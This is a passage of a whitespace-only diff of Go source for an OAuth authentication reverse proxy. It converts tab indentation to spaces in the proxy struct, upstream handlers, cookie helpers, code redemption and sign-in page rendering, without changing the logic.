CookieHTTPOnly bool\n+        CookieExpire   time.Duration\n+        CookieRefresh  time.Duration\n+        CookieSameSite string\n+        Validator      func(string) bool\n+\n+        RobotsPath        string\n+        SignInPath        string\n+        SignOutPath       string\n+        OAuthStartPath    string\n+        OAuthCallbackPath string\n+        AuthOnlyPath      string\n+        UserInfoPath      string\n+\n+        redirectURL             *url.URL // the url to receive requests at\n+        whitelistDomains        []string\n+        provider                providers.Provider\n+        providerNameOverride    string\n+        sessionStore            sessionsapi.SessionStore\n+        ProxyPrefix             string\n+        SignInMessage           string\n+        HtpasswdFile            *HtpasswdFile\n+        DisplayHtpasswdForm     bool\n+        serveMux                http.Handler\n+        SetXAuthRequest         bool\n+        PassBasicAuth           bool\n+        SetBasicAuth            bool\n+        SkipProviderButton      bool\n+        PassUserHeaders         bool\n+        BasicAuthPassword       string\n+        PassAccessToken         bool\n+        SetAuthorization        bool\n+        PassAuthorization       bool\n+        PreferEmailToUser       bool\n+        skipAuthRegex           []string\n+        skipAuthPreflight       bool\n+        skipJwtBearerTokens     bool\n+        mainJwtBearerVerifier   *oidc.IDTokenVerifier\n+        extraJwtBearerVerifiers []*oidc.IDTokenVerifier\n+        compiledRegex           []*regexp.Regexp\n+        templates               *template.Template\n+        realClientIPParser      ipapi.RealClientIPParser\n+        Banner                  string\n+        Footer                  string\n }\n \n // UpstreamProxy represents an upstream server to proxy to\n type UpstreamProxy struct {\n-\tupstream  string\n-\thandler   http.Handler\n-\twsHandler http.Handler\n-\tauth      hmacauth.HmacAuth\n+        upstream  string\n+        handler   http.Handler\n+        wsHandler http.Handler\n+        auth      hmacauth.HmacAuth\n }\n \n // ServeHTTP proxies requests to the upstream provider while signing the\n // request headers\n func (u *UpstreamProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n-\tw.Header().Set(\"GAP-Upstream-Address\", u.upstream)\n-\tif u.auth != nil {\n-\t\tr.Header.Set(\"GAP-Auth\", w.Header().Get(\"GAP-Auth\"))\n-\t\tu.auth.SignRequest(r)\n-\t}\n-\tif u.wsHandler != nil && strings.EqualFold(r.Header.Get(\"Connection\"), \"upgrade\") && r.Header.Get(\"Upgrade\") == \"websocket\" {\n-\t\tu.wsHandler.ServeHTTP(w, r)\n-\t} else {\n-\t\tu.handler.ServeHTTP(w, r)\n-\t}\n+        w.Header().Set(\"GAP-Upstream-Address\", u.upstream)\n+        if u.auth != nil {\n+                r.Header.Set(\"GAP-Auth\", w.Header().Get(\"GAP-Auth\"))\n+                u.auth.SignRequest(r)\n+        }\n+        if u.wsHandler != nil && strings.EqualFold(r.Header.Get(\"Connection\"), \"upgrade\") && r.Header.Get(\"Upgrade\") == \"websocket\" {\n+                u.wsHandler.ServeHTTP(w, r)\n+        } else {\n+                u.handler.ServeHTTP(w, r)\n+        }\n \n }\n \n // NewReverseProxy creates a new reverse proxy for proxying requests to upstream\n // servers\n func NewReverseProxy(target *url.URL, opts *options.Options) (proxy *httputil.ReverseProxy) {\n-\tproxy = httputil.NewSingleHostReverseProxy(target)\n-\tproxy.FlushInterval = opts.FlushInterval\n-\tif opts.SSLUpstreamInsecureSkipVerify {\n-\t\tproxy.Transport = &http.Transport{\n-\t\t\tTLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n-\t\t}\n-\t}\n-\tsetProxyErrorHandler(proxy, opts)\n-\treturn proxy\n+        proxy = httputil.NewSingleHostReverseProxy(target)\n+        proxy.FlushInterval = opts.FlushInterval\n+        if opts.SSLUpstreamInsecureSkipVerify {\n+                proxy.Transport = &http.Transport{\n+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n+                }\n+        }\n+        setProxyErrorHandler(proxy, opts)\n+        return proxy\n }\n \n func setProxyErrorHandler(proxy *httputil.ReverseProxy, opts *options.Options) {\n-\ttemplates := loadTemplates(opts.CustomTemplatesDir)\n-\tproxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, proxyErr error) {\n-\t\tlogger.Printf(\"Error proxying to upstream server: %v\", proxyErr)\n-\t\tw.WriteHeader(http.StatusBadGateway)\n-\t\tdata := struct {\n-\t\t\tTitle       string\n-\t\t\tMessage     string\n-\t\t\tProxyPrefix string\n-\t\t}{\n-\t\t\tTitle:       \"Bad Gateway\",\n-\t\t\tMessage:     \"Error proxying to upstream server\",\n-\t\t\tProxyPrefix: opts.ProxyPrefix,\n-\t\t}\n-\t\ttemplates.ExecuteTemplate(w, \"error.html\", data)\n-\t}\n+        templates := loadTemplates(opts.CustomTemplatesDir)\n+        proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, proxyErr error) {\n+                logger.Printf(\"Error proxying to upstream server: %v\", proxyErr)\n+                w.WriteHeader(http.StatusBadGateway)\n+                data := struct {\n+                        Title       string\n+                        Message     string\n+                        ProxyPrefix string\n+                }{\n+                        Title:       \"Bad Gateway\",\n+                        Message:     \"Error proxying to upstream server\",\n+                        ProxyPrefix: opts.ProxyPrefix,\n+                }\n+                templates.ExecuteTemplate(w, \"error.html\", data)\n+        }\n }\n \n func setProxyUpstreamHostHeader(proxy *httputil.ReverseProxy, target *url.URL) {\n-\tdirector := proxy.Director\n-\tproxy.Director = func(req *http.Request) {\n-\t\tdirector(req)\n-\t\t// use RequestURI so that we aren't unescaping encoded slashes in the request path\n-\t\treq.Host = target.Host\n-\t\treq.URL.Opaque = req.RequestURI\n-\t\treq.URL.RawQuery = \"\"\n-\t}\n+        director := proxy.Director\n+        proxy.Director = func(req *http.Request) {\n+                director(req)\n+                // use RequestURI so that we aren't unescaping encoded slashes in the request path\n+                req.Host = target.Host\n+                req.URL.Opaque = req.RequestURI\n+                req.URL.RawQuery = \"\"\n+        }\n }\n \n func setProxyDirector(proxy *httputil.ReverseProxy) {\n-\tdirector := proxy.Director\n-\tproxy.Director = func(req *http.Request) {\n-\t\tdirector(req)\n-\t\t// use RequestURI so that we aren't unescaping encoded slashes in the request path\n-\t\treq.URL.Opaque = req.RequestURI\n-\t\treq.URL.RawQuery = \"\"\n-\t}\n+        director := proxy.Director\n+        proxy.Director = func(req *http.Request) {\n+                director(req)\n+                // use RequestURI so that we aren't unescaping encoded slashes in the request path\n+                req.URL.Opaque = req.RequestURI\n+                req.URL.RawQuery = \"\"\n+        }\n }\n \n // NewFileServer creates a http.Handler to serve files from the filesystem\n func NewFileServer(path string, filesystemPath string) (proxy http.Handler) {\n-\treturn http.StripPrefix(path, http.FileServer(http.Dir(filesystemPath)))\n+        return http.StripPrefix(path, http.FileServer(http.Dir(filesystemPath)))\n }\n \n // NewWebSocketOrRestReverseProxy creates a reverse proxy for REST or websocket based on url\n func NewWebSocketOrRestReverseProxy(u *url.URL, opts *options.Options, auth hmacauth.HmacAuth) http.Handler {\n-\tu.Path = \"\"\n-\tproxy := NewReverseProxy(u, opts)\n-\tif !opts.PassHostHeader {\n-\t\tsetProxyUpstreamHostHeader(proxy, u)\n-\t} else {\n-\t\tsetProxyDirector(proxy)\n-\t}\n-\n-\t// this should give us a wss:// scheme if the url is https:// based.\n-\tvar wsProxy *wsutil.ReverseProxy\n-\tif opts.ProxyWebSockets {\n-\t\twsScheme := \"ws\" + strings.TrimPrefix(u.Scheme, \"http\")\n-\t\twsURL := &url.URL{Scheme: wsScheme, Host: u.Host}\n-\t\twsProxy = wsutil.NewSingleHostReverseProxy(wsURL)\n-\t\tif opts.SSLUpstreamInsecureSkipVerify {\n-\t\t\twsProxy.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}\n-\t\t}\n-\t}\n-\treturn &UpstreamProxy{\n-\t\tupstream:  u.Host,\n-\t\thandler:   proxy,\n-\t\twsHandler: wsProxy,\n-\t\tauth:      auth,\n-\t}\n+        u.Path = \"\"\n+        proxy := NewReverseProxy(u, opts)\n+        if !opts.PassHostHeader {\n+                setProxyUpstreamHostHeader(proxy, u)\n+        } else {\n+                setProxyDirector(proxy)\n+        }\n+\n+        // this should give us a wss:// scheme if the url is https:// based.\n+        var wsProxy *wsutil.ReverseProxy\n+        if opts.ProxyWebSockets {\n+                wsScheme := \"ws\" + strings.TrimPrefix(u.Scheme, \"http\")\n+                wsURL := &url.URL{Scheme: wsScheme, Host: u.Host}\n+                wsProxy = wsutil.NewSingleHostReverseProxy(wsURL)\n+                if opts.SSLUpstreamInsecureSkipVerify {\n+                        wsProxy.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}\n+                }\n+        }\n+        return &UpstreamProxy{\n+                upstream:  u.Host,\n+                handler:   proxy,\n+                wsHandler: wsProxy,\n+                auth:      auth,\n+        }\n }\n \n // NewOAuthProxy creates a new instance of OAuthProxy from the options provided\n func NewOAuthProxy(opts *options.Options, validator func(string) bool) *OAuthProxy {\n-\tserveMux := http.NewServeMux()\n-\tvar auth hmacauth.HmacAuth\n-\tif sigData := opts.GetSignatureData(); sigData != nil {\n-\t\tauth = hmacauth.NewHmacAuth(sigData.Hash, []byte(sigData.Key),\n-\t\t\tSignatureHeader, SignatureHeaders)\n-\t}\n-\tfor _, u := range opts.GetProxyURLs() {\n-\t\tpath := u.Path\n-\t\thost := u.Host\n-\t\tswitch u.Scheme {\n-\t\tcase httpScheme, httpsScheme:\n-\t\t\tlogger.Printf(\"mapping path %q => upstream %q\", path, u)\n-\t\t\tproxy := NewWebSocketOrRestReverseProxy(u, opts, auth)\n-\t\t\tserveMux.Handle(path, proxy)\n-\t\tcase \"static\":\n-\t\t\tresponseCode, err := strconv.Atoi(host)\n-\t\t\tif err != nil {\n-\t\t\t\tlogger.Printf(\"unable to convert %q to int, use default \\\"200\\\"\", host)\n-\t\t\t\tresponseCode = 200\n-\t\t\t}\n-\n-\t\t\tserveMux.HandleFunc(path, func(rw http.ResponseWriter, req *http.Request) {\n-\t\t\t\trw.WriteHeader(responseCode)\n-\t\t\t\tfmt.Fprintf(rw, \"Authenticated\")\n-\t\t\t})\n-\t\tcase \"file\":\n-\t\t\tif u.Fragment != \"\" {\n-\t\t\t\tpath = u.Fragment\n-\t\t\t}\n-\t\t\tlogger.Printf(\"mapping path %q => file system %q\", path, u.Path)\n-\t\t\tproxy := NewFileServer(path, u.Path)\n-\t\t\tuProxy := UpstreamProxy{\n-\t\t\t\tupstream:  path,\n-\t\t\t\thandler:   proxy,\n-\t\t\t\twsHandler: nil,\n-\t\t\t\tauth:      nil,\n-\t\t\t}\n-\t\t\tserveMux.Handle(path, &uProxy)\n-\t\tdefault:\n-\t\t\tpanic(fmt.Sprintf(\"unknown upstream protocol %s\", u.Scheme))\n-\t\t}\n-\t}\n-\tfor _, u := range opts.GetCompiledRegex() {\n-\t\tlogger.Printf(\"compiled skip-auth-regex => %q\", u)\n-\t}\n-\n-\tif opts.SkipJwtBearerTokens {\n-\t\tlogger.Printf(\"Skipping JWT tokens from configured OIDC issuer: %q\", opts.OIDCIssuerURL)\n-\t\tfor _, issuer := range opts.ExtraJwtIssuers {\n-\t\t\tlogger.Printf(\"Skipping JWT tokens from extra JWT issuer: %q\", issuer)\n-\t\t}\n-\t}\n-\tredirectURL := opts.GetRedirectURL()\n-\tif redirectURL.Path == \"\" {\n-\t\tredirectURL.Path = fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix)\n-\t}\n-\n-\tlogger.Printf(\"OAuthProxy configured for %s Client ID: %s\", opts.GetProvider().Data().ProviderName, opts.ClientID)\n-\trefresh := \"disabled\"\n-\tif opts.Cookie.Refresh != time.Duration(0) {\n-\t\trefresh = fmt.Sprintf(\"after %s\", opts.Cookie.Refresh)\n-\t}\n-\n-\tlogger.Printf(\"Cookie settings: name:%s secure(https):%v httponly:%v expiry:%s domains:%s path:%s samesite:%s refresh:%s\", opts.Cookie.Name, opts.Cookie.Secure, opts.Cookie.HTTPOnly, opts.Cookie.Expire, strings.Join(opts.Cookie.Domains, \",\"), opts.Cookie.Path, opts.Cookie.SameSite, refresh)\n-\n-\treturn &OAuthProxy{\n-\t\tCookieName:     opts.Cookie.Name,\n-\t\tCSRFCookieName: fmt.Sprintf(\"%v_%v\", opts.Cookie.Name, \"csrf\"),\n-\t\tCookieSeed:     opts.Cookie.Secret,\n-\t\tCookieDomains:  opts.Cookie.Domains,\n-\t\tCookiePath:     opts.Cookie.Path,\n-\t\tCookieSecure:   opts.Cookie.Secure,\n-\t\tCookieHTTPOnly: opts.Cookie.HTTPOnly,\n-\t\tCookieExpire:   opts.Cookie.Expire,\n-\t\tCookieRefresh:  opts.Cookie.Refresh,\n-\t\tCookieSameSite: opts.Cookie.SameSite,\n-\t\tValidator:      validator,\n-\n-\t\tRobotsPath:        \"/robots.txt\",\n-\t\tSignInPath:        fmt.Sprintf(\"%s/sign_in\", opts.ProxyPrefix),\n-\t\tSignOutPath:       fmt.Sprintf(\"%s/sign_out\", opts.ProxyPrefix),\n-\t\tOAuthStartPath:    fmt.Sprintf(\"%s/start\", opts.ProxyPrefix),\n-\t\tOAuthCallbackPath: fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix),\n-\t\tAuthOnlyPath:      fmt.Sprintf(\"%s/auth\", opts.ProxyPrefix),\n-\t\tUserInfoPath:      fmt.Sprintf(\"%s/userinfo\", opts.ProxyPrefix),\n-\n-\t\tProxyPrefix:             opts.ProxyPrefix,\n-\t\tprovider:                opts.GetProvider(),\n-\t\tproviderNameOverride:    opts.ProviderName,\n-\t\tsessionStore:            opts.GetSessionStore(),\n-\t\tserveMux:                serveMux,\n-\t\tredirectURL:             redirectURL,\n-\t\twhitelistDomains:        opts.WhitelistDomains,\n-\t\tskipAuthRegex:           opts.SkipAuthRegex,\n-\t\tskipAuthPreflight:       opts.SkipAuthPreflight,\n-\t\tskipJwtBearerTokens:     opts.SkipJwtBearerTokens,\n-\t\tmainJwtBearerVerifier:   opts.GetOIDCVerifier(),\n-\t\textraJwtBearerVerifiers: opts.GetJWTBearerVerifiers(),\n-\t\tcompiledRegex:           opts.GetCompiledRegex(),\n-\t\trealClientIPParser:      opts.GetRealClientIPParser(),\n-\t\tSetXAuthRequest:         opts.SetXAuthRequest,\n-\t\tPassBasicAuth:           opts.PassBasicAuth,\n-\t\tSetBasicAuth:            opts.SetBasicAuth,\n-\t\tPassUserHeaders:         opts.PassUserHeaders,\n-\t\tBasicAuthPassword:       opts.BasicAuthPassword,\n-\t\tPassAccessToken:         opts.PassAccessToken,\n-\t\tSetAuthorization:        opts.SetAuthorization,\n-\t\tPassAuthorization:       opts.PassAuthorization,\n-\t\tPreferEmailToUser:       opts.PreferEmailToUser,\n-\t\tSkipProviderButton:      opts.SkipProviderButton,\n-\t\ttemplates:               loadTemplates(opts.CustomTemplatesDir),\n-\t\tBanner:                  opts.Banner,\n-\t\tFooter:                  opts.Footer,\n-\t}\n+        serveMux := http.NewServeMux()\n+        var auth hmacauth.HmacAuth\n+        if sigData := opts.GetSignatureData(); sigData != nil {\n+                auth = hmacauth.NewHmacAuth(sigData.Hash, []byte(sigData.Key),\n+                        SignatureHeader, SignatureHeaders)\n+        }\n+        for _, u := range opts.GetProxyURLs() {\n+                path := u.Path\n+                host := u.Host\n+                switch u.Scheme {\n+                case httpScheme, httpsScheme:\n+                        logger.Printf(\"mapping path %q => upstream %q\", path, u)\n+                        proxy := NewWebSocketOrRestReverseProxy(u, opts, auth)\n+                        serveMux.Handle(path, proxy)\n+                case \"static\":\n+                        responseCode, err := strconv.Atoi(host)\n+                        if err != nil {\n+                                logger.Printf(\"unable to convert %q to int, use default \\\"200\\\"\", host)\n+                                responseCode = 200\n+                        }\n+\n+                        serveMux.HandleFunc(path, func(rw http.ResponseWriter, req *http.Request) {\n+                                rw.WriteHeader(responseCode)\n+                                fmt.Fprintf(rw, \"Authenticated\")\n+                        })\n+                case \"file\":\n+                        if u.Fragment != \"\" {\n+                                path = u.Fragment\n+                        }\n+                        logger.Printf(\"mapping path %q => file system %q\", path, u.Path)\n+                        proxy := NewFileServer(path, u.Path)\n+                        uProxy := UpstreamProxy{\n+                                upstream:  path,\n+                                handler:   proxy,\n+                                wsHandler: nil,\n+                                auth:      nil,\n+                        }\n+                        serveMux.Handle(path, &uProxy)\n+                default:\n+                        panic(fmt.Sprintf(\"unknown upstream protocol %s\", u.Scheme))\n+                }\n+        }\n+        for _, u := range opts.GetCompiledRegex() {\n+                logger.Printf(\"compiled skip-auth-regex => %q\", u)\n+        }\n+\n+        if opts.SkipJwtBearerTokens {\n+                logger.Printf(\"Skipping JWT tokens from configured OIDC issuer: %q\", opts.OIDCIssuerURL)\n+                for _, issuer := range opts.ExtraJwtIssuers {\n+                        logger.Printf(\"Skipping JWT tokens from extra JWT issuer: %q\", issuer)\n+                }\n+        }\n+        redirectURL := opts.GetRedirectURL()\n+        if redirectURL.Path == \"\" {\n+                redirectURL.Path = fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix)\n+        }\n+\n+        logger.Printf(\"OAuthProxy configured for %s Client ID: %s\", opts.GetProvider().Data().ProviderName, opts.ClientID)\n+        refresh := \"disabled\"\n+        if opts.Cookie.Refresh != time.Duration(0) {\n+                refresh = fmt.Sprintf(\"after %s\", opts.Cookie.Refresh)\n+        }\n+\n+        logger.Printf(\"Cookie settings: name:%s secure(https):%v httponly:%v expiry:%s domains:%s path:%s samesite:%s refresh:%s\", opts.Cookie.Name, opts.Cookie.Secure, opts.Cookie.HTTPOnly, opts.Cookie.Expire, strings.Join(opts.Cookie.Domains, \",\"), opts.Cookie.Path, opts.Cookie.SameSite, refresh)\n+\n+        return &OAuthProxy{\n+                CookieName:     opts.Cookie.Name,\n+                CSRFCookieName: fmt.Sprintf(\"%v_%v\", opts.Cookie.Name, \"csrf\"),\n+                CookieSeed:     opts.Cookie.Secret,\n+                CookieDomains:  opts.Cookie.Domains,\n+                CookiePath:     opts.Cookie.Path,\n+                CookieSecure:   opts.Cookie.Secure,\n+                CookieHTTPOnly: opts.Cookie.HTTPOnly,\n+                CookieExpire:   opts.Cookie.Expire,\n+                CookieRefresh:  opts.Cookie.Refresh,\n+                CookieSameSite: opts.Cookie.SameSite,\n+                Validator:      validator,\n+\n+                RobotsPath:        \"/robots.txt\",\n+                SignInPath:        fmt.Sprintf(\"%s/sign_in\", opts.ProxyPrefix),\n+                SignOutPath:       fmt.Sprintf(\"%s/sign_out\", opts.ProxyPrefix),\n+                OAuthStartPath:    fmt.Sprintf(\"%s/start\", opts.ProxyPrefix),\n+                OAuthCallbackPath: fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix),\n+                AuthOnlyPath:      fmt.Sprintf(\"%s/auth\", opts.ProxyPrefix),\n+                UserInfoPath:      fmt.Sprintf(\"%s/userinfo\", opts.ProxyPrefix),\n+\n+                ProxyPrefix:             opts.ProxyPrefix,\n+                provider:                opts.GetProvider(),\n+                providerNameOverride:    opts.ProviderName,\n+                sessionStore:            opts.GetSessionStore(),\n+                serveMux:                serveMux,\n+                redirectURL:             redirectURL,\n+                whitelistDomains:        opts.WhitelistDomains,\n+                skipAuthRegex:           opts.SkipAuthRegex,\n+                skipAuthPreflight:       opts.SkipAuthPreflight,\n+                skipJwtBearerTokens:     opts.SkipJwtBearerTokens,\n+                mainJwtBearerVerifier:   opts.GetOIDCVerifier(),\n+                extraJwtBearerVerifiers: opts.GetJWTBearerVerifiers(),\n+                compiledRegex:           opts.GetCompiledRegex(),\n+                realClientIPParser:      opts.GetRealClientIPParser(),\n+                SetXAuthRequest:         opts.SetXAuthRequest,\n+                PassBasicAuth:           opts.PassBasicAuth,\n+                SetBasicAuth:            opts.SetBasicAuth,\n+                PassUserHeaders:         opts.PassUserHeaders,\n+                BasicAuthPassword:       opts.BasicAuthPassword,\n+                PassAccessToken:         opts.PassAccessToken,\n+                SetAuthorization:        opts.SetAuthorization,\n+                PassAuthorization:       opts.PassAuthorization,\n+                PreferEmailToUser:       opts.PreferEmailToUser,\n+                SkipProviderButton:      opts.SkipProviderButton,\n+                templates:               loadTemplates(opts.CustomTemplatesDir),\n+                Banner:                  opts.Banner,\n+                Footer:                  opts.Footer,\n+        }\n }\n \n // GetRedirectURI returns the redirectURL that the upstream OAuth Provider will\n // redirect clients to once authenticated\n func (p *OAuthProxy) GetRedirectURI(host string) string {\n-\t// default to the request Host if not set\n-\tif p.redirectURL.Host != \"\" {\n-\t\treturn p.redirectURL.String()\n-\t}\n-\tu := *p.redirectURL\n-\tif u.Scheme == \"\" {\n-\t\tif p.CookieSecure {\n-\t\t\tu.Scheme = httpsScheme\n-\t\t} else {\n-\t\t\tu.Scheme = httpScheme\n-\t\t}\n-\t}\n-\tu.Host = host\n-\treturn u.String()\n+        // default to the request Host if not set\n+        if p.redirectURL.Host != \"\" {\n+                return p.redirectURL.String()\n+        }\n+        u := *p.redirectURL\n+        if u.Scheme == \"\" {\n+                if p.CookieSecure {\n+                        u.Scheme = httpsScheme\n+                } else {\n+                        u.Scheme = httpScheme\n+                }\n+        }\n+        u.Host = host\n+        return u.String()\n }\n \n func (p *OAuthProxy) displayCustomLoginForm() bool {\n-\treturn p.HtpasswdFile != nil && p.DisplayHtpasswdForm\n+        return p.HtpasswdFile != nil && p.DisplayHtpasswdForm\n }\n \n func (p *OAuthProxy) redeemCode(ctx context.Context, host, code string) (s *sessionsapi.SessionState, err error) {\n-\tif code == \"\" {\n-\t\treturn nil, errors.New(\"missing code\")\n-\t}\n-\tredirectURI := p.GetRedirectURI(host)\n-\ts, err = p.provider.Redeem(ctx, redirectURI, code)\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\n-\tif s.Email == \"\" {\n-\t\ts.Email, err = p.provider.GetEmailAddress(ctx, s)\n-\t}\n-\n-\tif s.PreferredUsername == \"\" {\n-\t\ts.PreferredUsername, err = p.provider.GetPreferredUsername(ctx, s)\n-\t\tif err != nil && err.Error() == \"not implemented\" {\n-\t\t\terr = nil\n-\t\t}\n-\t}\n-\n-\tif s.User == \"\" {\n-\t\ts.User, err = p.provider.GetUserName(ctx, s)\n-\t\tif err != nil && err.Error() == \"not implemented\" {\n-\t\t\terr = nil\n-\t\t}\n-\t}\n-\treturn\n+        if code == \"\" {\n+                return nil, errors.New(\"missing code\")\n+        }\n+        redirectURI := p.GetRedirectURI(host)\n+        s, err = p.provider.Redeem(ctx, redirectURI, code)\n+        if err != nil {\n+                return\n+        }\n+\n+        if s.Email == \"\" {\n+                s.Email, err = p.provider.GetEmailAddress(ctx, s)\n+        }\n+\n+        if s.PreferredUsername == \"\" {\n+                s.PreferredUsername, err = p.provider.GetPreferredUsername(ctx, s)\n+                if err != nil && err.Error() == \"not implemented\" {\n+                        err = nil\n+                }\n+        }\n+\n+        if s.User == \"\" {\n+                s.User, err = p.provider.GetUserName(ctx, s)\n+                if err != nil && err.Error() == \"not implemented\" {\n+                        err = nil\n+                }\n+        }\n+        return\n }\n \n // MakeCSRFCookie creates a cookie for CSRF\n func (p *OAuthProxy) MakeCSRFCookie(req *http.Request, value string, expiration time.Duration, now time.Time) *http.Cookie {\n-\treturn p.makeCookie(req, p.CSRFCookieName, value, expiration, now)\n+        return p.makeCookie(req, p.CSRFCookieName, value, expiration, now)\n }\n \n func (p *OAuthProxy) makeCookie(req *http.Request, name string, value string, expiration time.Duration, now time.Time) *http.Cookie {\n-\tcookieDomain := cookies.GetCookieDomain(req, p.CookieDomains)\n-\n-\tif cookieDomain != \"\" {\n-\t\tdomain := cookies.GetRequestHost(req)\n-\t\tif h, _, err := net.SplitHostPort(domain); err == nil {\n-\t\t\tdomain = h\n-\t\t}\n-\t\tif !strings.HasSuffix(domain, cookieDomain) {\n-\t\t\tlogger.Printf(\"Warning: request host is %q but using configured cookie domain of %q\", domain, cookieDomain)\n-\t\t}\n-\t}\n-\n-\treturn &http.Cookie{\n-\t\tName:     name,\n-\t\tValue:    value,\n-\t\tPath:     p.CookiePath,\n-\t\tDomain:   cookieDomain,\n-\t\tHttpOnly: p.CookieHTTPOnly,\n-\t\tSecure:   p.CookieSecure,\n-\t\tExpires:  now.Add(expiration),\n-\t\tSameSite: cookies.ParseSameSite(p.CookieSameSite),\n-\t}\n+        cookieDomain := cookies.GetCookieDomain(req, p.CookieDomains)\n+\n+        if cookieDomain != \"\" {\n+                domain := cookies.GetRequestHost(req)\n+                if h, _, err := net.SplitHostPort(domain); err == nil {\n+                        domain = h\n+                }\n+                if !strings.HasSuffix(domain, cookieDomain) {\n+                        logger.Printf(\"Warning: request host is %q but using configured cookie domain of %q\", domain, cookieDomain)\n+                }\n+        }\n+\n+        return &http.Cookie{\n+                Name:     name,\n+                Value:    value,\n+                Path:     p.CookiePath,\n+                Domain:   cookieDomain,\n+                HttpOnly: p.CookieHTTPOnly,\n+                Secure:   p.CookieSecure,\n+                Expires:  now.Add(expiration),\n+                SameSite: cookies.ParseSameSite(p.CookieSameSite),\n+        }\n }\n \n // ClearCSRFCookie creates a cookie to unset the CSRF cookie stored in the user's\n // session\n func (p *OAuthProxy) ClearCSRFCookie(rw http.ResponseWriter, req *http.Request) {\n-\thttp.SetCookie(rw, p.MakeCSRFCookie(req, \"\", time.Hour*-1, time.Now()))\n+        http.SetCookie(rw, p.MakeCSRFCookie(req, \"\", time.Hour*-1, time.Now()))\n }\n \n // SetCSRFCookie adds a CSRF cookie to the response\n func (p *OAuthProxy) SetCSRFCookie(rw http.ResponseWriter, req *http.Request, val string) {\n-\thttp.SetCookie(rw, p.MakeCSRFCookie(req, val, p.CookieExpire, time.Now()))\n+        http.SetCookie(rw, p.MakeCSRFCookie(req, val, p.CookieExpire, time.Now()))\n }\n \n // ClearSessionCookie creates a cookie to unset the user's authentication cookie\n // stored in the user's session\n func (p *OAuthProxy) ClearSessionCookie(rw http.ResponseWriter, req *http.Request) error {\n-\treturn p.sessionStore.Clear(rw, req)\n+        return p.sessionStore.Clear(rw, req)\n }\n \n // LoadCookiedSession reads the user's authentication details from the request\n func (p *OAuthProxy) LoadCookiedSession(req *http.Request) (*sessionsapi.SessionState, error) {\n-\treturn p.sessionStore.Load(req)\n+        return p.sessionStore.Load(req)\n }\n \n // SaveSession creates a new session cookie value and sets this on the response\n func (p *OAuthProxy) SaveSession(rw http.ResponseWriter, req *http.Request, s *sessionsapi.SessionState) error {\n-\treturn p.sessionStore.Save(rw, req, s)\n+        return p.sessionStore.Save(rw, req, s)\n }\n \n // RobotsTxt disallows scraping pages from the OAuthProxy\n func (p *OAuthProxy) RobotsTxt(rw http.ResponseWriter) {\n-\trw.WriteHeader(http.StatusOK)\n-\tfmt.Fprintf(rw, \"User-agent: *\\nDisallow: /\")\n+        rw.WriteHeader(http.StatusOK)\n+        fmt.Fprintf(rw, \"User-agent: *\\nDisallow: /\")\n }\n \n // ErrorPage writes an error response\n func (p *OAuthProxy) ErrorPage(rw http.ResponseWriter, code int, title string, message string) {\n-\trw.WriteHeader(code)\n-\tt := struct {\n-\t\tTitle       string\n-\t\tMessage     string\n-\t\tProxyPrefix string\n-\t}{\n-\t\tTitle:       fmt.Sprintf(\"%d %s\", code, title),\n-\t\tMessage:     message,\n-\t\tProxyPrefix: p.ProxyPrefix,\n-\t}\n-\tp.templates.ExecuteTemplate(rw, \"error.html\", t)\n+        rw.WriteHeader(code)\n+        t := struct {\n+                Title       string\n+                Message     string\n+                ProxyPrefix string\n+        }{\n+                Title:       fmt.Sprintf(\"%d %s\", code, title),\n+                Message:     message,\n+                ProxyPrefix: p.ProxyPrefix,\n+        }\n+        p.templates.ExecuteTemplate(rw, \"error.html\", t)\n }\n \n // SignInPage writes the sing in template to the response\n func (p *OAuthProxy) SignInPage(rw http.ResponseWriter, req *http.Request, code int) {\n-\tprepareNoCache(rw)\n-\tp.ClearSessionCookie(rw, req)\n-\trw.WriteHeader(code)\n-\n-\tredirectURL, err := p.GetRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining redirect: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\n-\tif redirectURL == p.SignInPath {\n-\t\tredirectURL = \"/\"\n-\t}\n-\n-\tt := struct {\n-\t\tProviderName  string\n-\t\tSignInMessage template.HTML\n-\t\tCustomLogin   bool\n-\t\tRedirect      string\n-\t\tVersion       string\n-\t\tProxyPrefix   string\n-\t\tFooter        template.HTML\n-\t}{\n-\t\tProviderName:  p.provider.Data().ProviderName,\n-\t\tSignInMessage: template.HTML(p.SignInMessage),\n-\t\tCustomLogin:   p.displayCustomLoginForm(),\n-\t\tRedirect:      redirectURL,\n-\t\tVersion:       VERSION,\n-\t\tProxyPrefix:   p.ProxyPrefix,\n-\t\tFooter:        template.HTML(p.Footer),\n-\t}\n-\tif p.providerNameOverride != \"\" {\n-\t\tt.ProviderName = p.providerNameOverride\n-\t}\n-\tp.templates.ExecuteTemplate(rw, \"sign_in.html\", t)\n+        prepareNoCache(rw)\n+        p.ClearSessionCookie(rw, req)\n+        rw.WriteHeader(code)\n+\n+        redirectURL, err := p.GetRedirect(req)\n+        if err != nil {\n+                logger.Printf(\"Error obtaining redirect: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+\n+        if redirectURL == p.SignInPath {\n+                redirectURL = \"/\"\n+        }\n+\n+        t := struct {\n+                ProviderName  string\n+                SignInMessage template.HTML\n+                CustomLogin   bool\n+                Redirect      string\n+                Version       string\n+                ProxyPrefix   string\n+                Footer        template.HTML\n+        }{\n+                ProviderName:  p.provider.Data().ProviderName,\n+                SignInMessage: template.HTML(p.SignInMessage),\n+                CustomLogin:   p.displayCustomLoginForm(),\n+                Redirect:      redirectURL,\n+                Version:       VERSION,\n+                ProxyPrefix:   p.ProxyPrefix,\n+                Footer:        template.HTML(p.Footer),\n+        }\n+        if p.providerNameOverride != \"\" {\n+                t.ProviderName = p.providerNameOverride\n+        }\n+        p.templates.ExecuteTemplate(rw, \"sign_in.html\", t)\n }\n \n 